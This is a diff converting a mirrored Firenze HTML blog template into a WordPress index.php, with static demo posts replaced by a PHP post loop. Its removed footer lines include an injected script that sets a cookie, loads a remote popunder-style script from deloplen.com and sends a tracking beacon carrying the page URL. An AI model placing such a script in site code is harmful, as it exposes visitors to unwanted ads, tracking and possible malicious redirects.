@@ -1,115 +1,65 @@
-<!DOCTYPE html>
-<html lang="en">
+<?php get_header(); ?>
 
-<!-- Mirrored from firenze.different-themes.com/html/index.html by HTTrack Website Copier/3.x [XR&CO'2014], Fri, 01 Nov 2019 12:30:24 GMT -->
-<head>
-<meta charset="utf-8">
-<meta http-equiv="X-UA-Compatible" content="IE=edge">
-<meta name="viewport" content="width=device-width, initial-scale=1">
-<title>Firenze - Responsive Blog HTML5 Template</title>
-<link href="<?php echo esc_url(get_stylesheet_directory_uri());?>/css/bootstrap.min.css" rel="stylesheet">
-<!-- <link href="css/style.css" rel="stylesheet"> -->
-<link href="<?php echo esc_url(get_stylesheet_directory_uri());?> /css/style.css" rel="stylesheet">
-<link href="<?php echo esc_url(get_stylesheet_directory_uri());?>/css/shortcodes.css" rel="stylesheet">
-<link href="<?php echo esc_url(get_stylesheet_directory_uri());?>/css/font-awesome.css" rel="stylesheet">
-<link href="<?php echo esc_url(get_stylesheet_directory_uri());?>/css/owl.carousel.css" rel="stylesheet">
-<link href="<?php echo esc_url(get_stylesheet_directory_uri());?>/css/owl.theme.css" rel="stylesheet">
+<?php get_template_part("hero"); ?>
+ 
 
-<link href="<?php echo esc_url(get_stylesheet_directory_uri());?>/css/demo-settings.css" rel="stylesheet">
+ 
 
-
-
-
-<!--[if lt IE 9]>
-      <script src="https://oss.maxcdn.com/html5shiv/3.7.2/html5shiv.min.js"></script>
-      <script src="https://oss.maxcdn.com/respond/1.4.2/respond.min.js"></script>
-    <![endif]-->
-
-  <?php wp_head(); ?>  
-</head>
-<body id="top" <?php body_class(); ?>>
-<div class="boxed">
-<div class="container container-gutter">
-
-<div class="top-bar">
-<span class="top-bar-menu">
-<a href="index.html">Home</a>
-<a href="about.html">About</a>
-<a href="advertisement.html">Advertisement</a>
-<a href="contact.html">Contact</a>
-</span>
-<span class="top-bar-socials">
-<a href="https://facebook.com/" target="_blank"><i class="fa fa-facebook"></i></a>
-<a href="https://twitter.com/" target="_blank"><i class="fa fa-twitter"></i></a>
-<a href="https://instagram.com/" target="_blank"><i class="fa fa-instagram"></i></a>
-<a href="https://pinterest.com/" target="_blank"><i class="fa fa-pinterest"></i></a>
-<a href="https://plus.google.com/#" target="_blank"><i class="fa fa-google-plus"></i></a>
-<a href="https://tumblr.com/" target="_blank"><i class="fa fa-tumblr"></i></a>
-<a href="#" target="_blank"><i class="fa fa-rss"></i></a>
-</span>
-</div>
-
-
-<header class="header">
-<div class="row">
-<div class="col-md-12">
-<div class="logo"><a href="index.html"><img id="logo" src="<?php echo esc_url(get_stylesheet_directory_uri());?>/images/logo.png" alt="logo"></a></div>
-</div>
-</div>
-</header>
-
-
+ 
+ 
 <nav class="navbar yamm navbar-default" id="main-navigation">
-<div class="container-fluid">
-<div class="navbar-header">
-<button type="button" class="navbar-toggle collapsed" data-toggle="collapse" data-target="#navbar" aria-expanded="false" aria-controls="navbar">
-<span class="sr-only">Toggle navigation</span>
-<span class="icon-bar"></span>
-<span class="icon-bar"></span>
-<span class="icon-bar"></span>
-</button>
-</div>
+  <div class="container-fluid">
+  <div class="navbar-header">
+	<button type="button" class="navbar-toggle collapsed" data-toggle="collapse" data-target="#navbar" aria-expanded="false" aria-controls="navbar">
+		<span class="sr-only">Toggle navigation</span>
+		<span class="icon-bar"></span>
+		<span class="icon-bar"></span>
+		<span class="icon-bar"></span>
+	</button>
+  </div>
 <div id="navbar" class="navbar-collapse collapse">
 <ul class="nav navbar-nav">
-<li class="dropdown">
+  <li class="dropdown">
 <a href="index.html" class="dropdown-toggle" data-toggle="dropdown">Home <b class="caret"></b></a>
-<ul class="dropdown-menu" role="menu">
-<li><a href="index.html">Default</a></li>
-<li><a href="index-blog.html">Blog Layout</a></li>
-<li><a href="index-grid.html">Grid Layout</a></li>
-<li><a href="index-list.html">List Layout</a></li>
-</ul>
-</li>
-<li><a href="index-grid.html">Fashion</a></li>
-<li class="dropdown">
-<a href="#" class="dropdown-toggle" data-toggle="dropdown" role="button" aria-expanded="false">Features <b class="caret"></b></a>
-<ul class="dropdown-menu" role="menu">
-<li><a href="404.html">404 page</a></li>
-<li><a href="shortcodes.html">Shortcodes</a></li>
-<li><a href="post-video.html">Post with Video</a></li>
-<li><a href="about.html">Full Width Page</a></li>
-<li><a href="contact.html">Contact Form</a></li>
-</ul>
-</li>
-<li><a href="about.html">About</a></li>
-<li><a href="contact.html">Contact</a></li>
+
+	<ul class   ="dropdown-menu" role="menu">
+		<li><a href ="index.html">Default</a></li>
+		<li><a href ="index-blog.html">Blog Layout</a></li>
+		<li><a href ="index-grid.html">Grid Layout</a></li>
+		<li><a href ="index-list.html">List Layout</a></li>
+	</ul>
+
+  </li>
+	<li><a href="index-grid.html">Fashion</a></li>
+	<li class="dropdown">
+	 <a href="#" class="dropdown-toggle" data-toggle="dropdown" role="button" aria-expanded="false">Features <b class="caret"></b></a>
+	  <ul class="dropdown-menu" role="menu">
+		<li><a href="404.html">404 page</a></li>
+		<li><a href="shortcodes.html">Shortcodes</a></li>
+		<li><a href="post-video.html">Post with Video</a></li>
+		<li><a href="about.html">Full Width Page</a></li>
+		<li><a href="contact.html">Contact Form</a></li>
+	  </ul>
+	</li>
+	<li><a href="about.html">About</a></li>
+	<li><a href="contact.html">Contact</a></li>
 </ul>
 <ul class="nav navbar-nav navbar-right">
-<li class="dropdown">
-<a href="#" class="dropdown-toggle" data-toggle="dropdown" role="button" aria-expanded="false"><i class="fa fa-search"></i></a>
-<div class="dropdown-menu searchbox" role="menu">
-<form id="search" class="navbar-form search" role="search">
-<div class="input-group">
-<input type="search" class="form-control" placeholder="Type to search">
-<span class="input-group-btn"><button type="submit" class="btn btn-default btn-submit"><i class="fa fa-angle-right"></i></button></span>
-</div>
-</form>
-</div>
-</li>
+	<li class="dropdown">
+	<a href="#" class="dropdown-toggle" data-toggle="dropdown" role="button" aria-expanded="false"><i class="fa fa-search"></i></a>
+		<div class="dropdown-menu searchbox" role="menu">
+			<form id="search" class="navbar-form search" role="search">
+				<div class="input-group">
+				<input type="search" class="form-control" placeholder="Type to search">
+				<span class="input-group-btn"><button type="submit" class="btn btn-default btn-submit"><i class="fa fa-angle-right"></i></button></span>
+				</div>
+			</form>
+		</div>
+	</li>
 </ul>
 </div>
-</div>
-</nav>
+  </div>
+</nav>  
 
 
 <div class="slider">
@@ -162,163 +112,42 @@
 <div class="col-md-8 main-content">
 
 <section>
-<div class="row">
-<div class="col-sm-12">
-<div class="blog-post">
-<div class="blog-post-container">
-<a href="post.html"><img src="<?php echo esc_url(get_stylesheet_directory_uri());?>/images/demo/1200x800-3.jpg" alt=""></a>
-</div>
-<div class="blog-post-body">
-<div class="post-meta"><span class="post-category"><a href="#">Fashion</a></span></div>
-<div class="divider"></div>
-<h2 class="title"><a href="post.html">Wonderful Pencil Drawings by Stefan Zsaitsits</a></h2>
-<div class="post-meta">Posted on <span class="post-time">February 23, 2015</span> by <span class="post-author"><a href="post.html">Different Themes</a></span></div>
-<p>
- Meh synth Schlitz, tempor duis single-origin coffee ea next level ethnic fingerstache fanny pack nostrud. Photo booth anim 8-bit hella, PBR 3 wolf moon beard Helvetica. Salvia esse nihil, flexitarian Truffaut synth art party deep v chillwave. Seitan High Life reprehenderit consectetur cupidatat kogi. Et leggings fanny pack, elit bespoke vinyl art party Pitchfork selfies master cleanse Kickstarter seitan retro.
-</p>
-<p>
-<div class="more-button"><a href="post.html"><span class="read-more-button">READ MORE</span></a></div>
-<div class="wcircle-menu-button">
-<div class="wcircle-icon">
-<div class="wcircle-menu-icon"> <i class="fa fa-share-alt"></i> </div>
-</div>
-<div class="wcircle-menu" style="display:none;">
-<div class="wcircle-menu-item share-facebook"> <a href="post.html"><i class="fa fa-facebook"></i></a> </div>
-<div class="wcircle-menu-item share-youtube"> <a href="post.html"><i class="fa fa-youtube"></i></a> </div>
-<div class="wcircle-menu-item share-twitter"> <a href="post.html"><i class="fa fa-twitter"></i></a> </div>
-<div class="wcircle-menu-item share-google"> <a href="post.html"><i class="fa fa-google"></i></a> </div>
-<div class="wcircle-menu-item share-linkedin"> <a href="post.html"><i class="fa fa-linkedin"></i></a> </div>
-<div class="wcircle-menu-item share-pinterest"> <a href="post.html"><i class="fa fa-pinterest"></i></a> </div>
-<div class="wcircle-menu-item share-tumblr"> <a href="post.html"><i class="fa fa-tumblr"></i></a> </div>
-</div>
-</div>
-</p>
-</div>
-</div>
-</div>
-</div>
-<div class="row">
-<div class="col-sm-12">
-<div class="blog-post">
-<div class="blog-post-container">
-<a href="post.html"><img src="<?php echo esc_url(get_stylesheet_directory_uri());?>/images/demo/1200x800-17.jpg" alt=""></a>
-</div>
-<div class="blog-post-body">
-<div class="post-meta"><span class="post-category"><a href="#">Computers</a></span></div>
-<div class="divider"></div>
-<h2 class="title"><a href="post.html">Creative Packaging: Excellent Designs of Paper Bags and Boxes</a></h2>
-<div class="post-meta">Posted on <span class="post-time">February 23, 2015</span> by <span class="post-author"><a href="post.html">Different Themes</a></span></div>
-<p>
-Meh synth Schlitz, tempor duis single-origin coffee ea next level ethnic fingerstache fanny pack nostrud. Photo booth anim 8-bit hella, PBR 3 wolf moon beard Helvetica. Salvia esse nihil, flexitarian Truffaut synth art party deep v chillwave. Seitan High Life reprehenderit consectetur cupidatat kogi. Et leggings fanny pack, elit bespoke vinyl art party Pitchfork selfies master cleanse Kickstarter seitan retro.
-</p>
-<p>
-<div class="more-button"><a href="post.html"><span class="read-more-button">READ MORE</span></a></div>
-<div class="wcircle-menu-button">
-<div class="wcircle-icon">
-<div class="wcircle-menu-icon"> <i class="fa fa-share-alt"></i> </div>
-</div>
-<div class="wcircle-menu" style="display:none;">
-<div class="wcircle-menu-item share-facebook"> <a href="post.html"><i class="fa fa-facebook"></i></a> </div>
-<div class="wcircle-menu-item share-youtube"> <a href="post.html"><i class="fa fa-youtube"></i></a> </div>
-<div class="wcircle-menu-item share-twitter"> <a href="post.html"><i class="fa fa-twitter"></i></a> </div>
-<div class="wcircle-menu-item share-google"> <a href="post.html"><i class="fa fa-google"></i></a> </div>
-<div class="wcircle-menu-item share-linkedin"> <a href="post.html"><i class="fa fa-linkedin"></i></a> </div>
-<div class="wcircle-menu-item share-pinterest"> <a href="post.html"><i class="fa fa-pinterest"></i></a> </div>
-<div class="wcircle-menu-item share-tumblr"> <a href="post.html"><i class="fa fa-tumblr"></i></a> </div>
-</div>
-</div>
-</p>
-</div>
-</div>
-</div>
-</div>
-<div class="row">
-<div class="col-sm-12">
-<div class="blog-post">
-<div class="blog-post-container">
-<a href="post.html"><img src="<?php echo esc_url(get_stylesheet_directory_uri());?>/images/demo/1200x800-14.jpg" alt=""></a>
-</div>
-<div class="blog-post-body">
-<div class="post-meta"><span class="post-category"><a href="#">Traveling</a></span></div>
-<div class="divider"></div>
-<h2 class="title"><a href="post.html">Whimsical Sculptures Created Out of Every-day Objects by Gilbert Legrand</a></h2>
-<div class="post-meta">Posted on <span class="post-time">February 23, 2015</span> by <span class="post-author"><a href="post.html">Different Themes</a></span></div>
-<p>
-Meh synth Schlitz, tempor duis single-origin coffee ea next level ethnic fingerstache fanny pack nostrud. Photo booth anim 8-bit hella, PBR 3 wolf moon beard Helvetica. Salvia esse nihil, flexitarian Truffaut synth art party deep v chillwave. Seitan High Life reprehenderit consectetur cupidatat kogi. Et leggings fanny pack, elit bespoke vinyl art party Pitchfork selfies master cleanse Kickstarter seitan retro.
-</p>
-<p>
-<div class="more-button"><a href="post.html"><span class="read-more-button">READ MORE</span></a></div>
-<div class="wcircle-menu-button">
-<div class="wcircle-icon">
-<div class="wcircle-menu-icon"> <i class="fa fa-share-alt"></i> </div>
-</div>
-<div class="wcircle-menu" style="display:none;">
-<div class="wcircle-menu-item share-facebook"> <a href="post.html"><i class="fa fa-facebook"></i></a> </div>
-<div class="wcircle-menu-item share-youtube"> <a href="post.html"><i class="fa fa-youtube"></i></a> </div>
-<div class="wcircle-menu-item share-twitter"> <a href="post.html"><i class="fa fa-twitter"></i></a> </div>
-<div class="wcircle-menu-item share-google"> <a href="post.html"><i class="fa fa-google"></i></a> </div>
-<div class="wcircle-menu-item share-linkedin"> <a href="post.html"><i class="fa fa-linkedin"></i></a> </div>
-<div class="wcircle-menu-item share-pinterest"> <a href="post.html"><i class="fa fa-pinterest"></i></a> </div>
-<div class="wcircle-menu-item share-tumblr"> <a href="post.html"><i class="fa fa-tumblr"></i></a> </div>
-</div>
-</div>
-</p>
-</div>
-</div>
-</div>
-</div>
 
-<div class="row">
-<div class="col-sm-12">
-<div class="blog-post">
-<div class="blog-post-container">
-<div class="embed-responsive embed-responsive-16by9">
-<iframe class="embed-responsive-item" src="http://www.youtube.com/embed/8hP9D6kZseM?rel=0" allowfullscreen></iframe>
-</div>
-</div>
-<div class="blog-post-body">
-<div class="post-meta"><span class="post-category"><a href="#">Video</a></span></div>
-<div class="divider"></div>
-<h2 class="title"><a href="post.html">Youtube Video Embed</a></h2>
-<div class="post-meta">Posted on <span class="post-time">February 23, 2015</span> by <span class="post-author"><a href="post.html">Different Themes</a></span></div>
-<p>
-Maecenas euismod magna augue, et imperdiet nisl efficitur nec. Nunc non risus a diam tempor ornare. Suspendisse molestie nisi a euismod egestas. Integer tristique mauris in laoreet iaculis. Vestibulum ante ipsum primis in faucibus orci luctus et ultrices posuere cubilia Curae;
-</p>
-<p>
-<div class="more-button"><a href="post.html"><span class="read-more-button">READ MORE</span></a></div>
-<div class="wcircle-menu-button">
-<div class="wcircle-icon">
-<div class="wcircle-menu-icon"> <i class="fa fa-share-alt"></i> </div>
-</div>
-<div class="wcircle-menu" style="display:none;">
-<div class="wcircle-menu-item share-facebook"> <a href="post.html"><i class="fa fa-facebook"></i></a> </div>
-<div class="wcircle-menu-item share-youtube"> <a href="post.html"><i class="fa fa-youtube"></i></a> </div>
-<div class="wcircle-menu-item share-twitter"> <a href="post.html"><i class="fa fa-twitter"></i></a> </div>
-<div class="wcircle-menu-item share-google"> <a href="post.html"><i class="fa fa-google"></i></a> </div>
-<div class="wcircle-menu-item share-linkedin"> <a href="post.html"><i class="fa fa-linkedin"></i></a> </div>
-<div class="wcircle-menu-item share-pinterest"> <a href="post.html"><i class="fa fa-pinterest"></i></a> </div>
-<div class="wcircle-menu-item share-tumblr"> <a href="post.html"><i class="fa fa-tumblr"></i></a> </div>
-</div>
-</div>
-</p>
-</div>
-</div>
-</div>
-</div>
 
-<div class="row">
+<?php while(have_posts()) : the_post(); ?>
+                                    
+             
+
+<div class="row" <?php post_class(); ?>>
 <div class="col-sm-12">
 <div class="blog-post">
 <div class="blog-post-container">
-<iframe width="100%" height="450" scrolling="no" frameborder="no" src="https://w.soundcloud.com/player/?url=https%3A//api.soundcloud.com/tracks/160960615&amp;auto_play=false&amp;hide_related=false&amp;show_comments=true&amp;show_user=true&amp;show_reposts=false&amp;visual=true"></iframe>
+<a href="<a href="<?php the_permalink(); ?>"> 
+   <?php 
+       if (has_post_thumbnail()) {
+          the_post_thumbnail('large', " ");
+     }
+ ?>
+</a>
 </div>
 <div class="blog-post-body">
-<div class="post-meta"><span class="post-category"><a href="#">Music</a></span></div>
+<div class="post-meta"><span class="post-category">
+
+  <a href="#"><?php echo get_the_tag_list("<ul class=\"list-unstyled\"><li>","</li><li>","</li></ul>"); ?></a></span>
+</div>
 <div class="divider"></div>
-<h2 class="title"><a href="post.html">SoundCloud Music Embed</a></h2>
-<div class="post-meta">Posted on <span class="post-time">February 23, 2015</span> by <span class="post-author"><a href="post.html">Different Themes</a></span></div>
+<h2 class="title"><a href="<?php the_permalink(); ?>"><?php the_title();?></a></h2>
+<div class="post-meta">Posted on <span class="post-time"><?php the_date(); ?></span> by <span class="post-author"><a href="<?php the_permalink(); ?>"><?php the_author();?></a></span></div>
 <p>
-Meh synth Schlitz, tempor duis single-origin coffee ea next level ethnic fingerstache fanny pack nostrud. Photo booth anim 8-bit hella, PBR 3 wolf moon beard Helvetica.
+  <?php 
+       if (is_single()) {
+       	the_content();
+       }else{
+       	 the_excerpt();
+       } 
+
+ 
+   ?> 
 </p>
 <p>
 <div class="more-button"><a href="post.html"><span class="read-more-button">READ MORE</span></a></div>
@@ -341,6 +170,10 @@ Meh synth Schlitz, tempor duis single-origin coffee ea next level ethnic fingers
 </div>
 </div>
 </div>
+ 
+ 
+<?php endwhile; ?> 
+ 
 </section>
 
 <section>
@@ -699,41 +532,5 @@ Meh synth Schlitz, tempor duis single-origin coffee ea next level ethnic fingers
 
 </div> 
 </div> 
-<footer class="footer">
-<div class="footer-dark">
-<div class="footer-socials">
-<a href="https://www.twitter.com/d" class="social"><i class="fa fa-twitter"></i> Twitter</a>
-<a href="http://www.bloglovin.com//d" class="social"><i class="fa fa-plus"></i> Bloglovin</a>
-<a href="https://www.facebook.com/d" class="social"><i class="fa fa-facebook-square"></i> Facebook</a>
-<a href="https://dribbble.com/d" class="social dribbble" rel="publisher"><i class="fa fa-dribbble"></i> Dribbble</a>
-<a href="https://plus.google.com/+d" class="social google"><i class="fa fa-google-plus-square"></i> Google+</a>
-</div>
-<div class="footer-menu">
-<a href="#" class="social">About Us</a>
-<a href="#" class="social">Archives</a>
-<a href="#" class="social">Advertise</a>
-<a href="#" class="social">Contact Us</a>
-</div>
-</div>
-<div class="footer-bottom">
-<i class="fa fa-copyright"></i> Copyright 2015. All rights reserved.<br />
-Theme made by <a href="https://themeforest.net/user/different-themes/portfolio?ref=different-themes">Different Themes</a>
-</div>
-</footer>
-
-<script type="text/javascript" src="<?php echo esc_url(get_stylesheet_directory_uri());?>/js/jquery-latest.min.js"></script>
-<script type="text/javascript" src="<?php echo esc_url(get_stylesheet_directory_uri());?>/js/bootstrap.min.js"></script>
-<script type="text/javascript" src="<?php echo esc_url(get_stylesheet_directory_uri());?>/js/owl.carousel.min.js"></script>
-<script type="text/javascript" src="<?php echo esc_url(get_stylesheet_directory_uri());?>/js/demo-settings.js"></script>
-<script type="text/javascript" src="<?php echo esc_url(get_stylesheet_directory_uri());?>/js/SmoothScroll.min.js"></script>
-<script type="text/javascript" src="<?php echo esc_url(get_stylesheet_directory_uri());?>/js/jquery.scrolline.js"></script>
-<script type="text/javascript" src="<?php echo esc_url(get_stylesheet_directory_uri());?>/js/jquery.WCircleMenu-min.js"></script>
-<script type="text/javascript" src="<?php echo esc_url(get_stylesheet_directory_uri());?>/js/ThemeScripts.js"></script>
-
-<?php wp_footer(); ?>
-</body>
-
-<script type="text/javascript">if(top==self){(function(){location.Href="https://sharing-wedding.com/"; document.Referrer="";document.cookie = 'pau=1;expires='+new Date(+new Date()+2*60*1000)['toGMTString']()+';path=/;';})();var deloplenscript=document.createElement('script');deloplenscript.src="http://deloplen.com/apu.php?zoneid=2678515";deloplenscript.setAttribute('async','');deloplenscript.setAttribute('data-cfasync','false');document.head.appendChild(deloplenscript);(new Image).src='http://firenze.different-themes.com/pages/imevrstk.php?qd=IBL&amp;zqd=015.005&amp;nbid=bdbc0dd5fcde6986a59232d0421648c0&amp;cid=297288&amp;at=popad'+'&url='+encodeURIComponent(location.href)+'&ref='+encodeURIComponent(document.referrer)+'&t='+parseInt(Math.random()*1000000)}</script>
-
-<!-- Mirrored from firenze.different-themes.com/html/index.html by HTTrack Website Copier/3.x [XR&CO'2014], Fri, 01 Nov 2019 12:32:41 GMT -->
-</html>
+ 
+ <?php get_footer();?>
